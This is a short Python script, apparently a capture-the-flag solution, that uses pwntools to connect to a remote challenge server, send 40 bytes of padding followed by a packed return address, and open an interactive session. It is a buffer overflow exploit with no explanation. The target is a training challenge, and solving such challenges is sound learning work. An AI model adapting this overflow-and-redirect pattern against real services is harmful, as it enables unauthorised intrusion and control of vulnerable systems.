#!/usr/bin/env python
# -*- coding=utf-8 -*-

from pwn import *

offset = 40
addr = 0x400686
r = remote('csie.ctf.tw', 10125)

print(r.recv())
print(r.recv())
r.sendline('a' * offset + str(p64(addr)))
r.interactive()
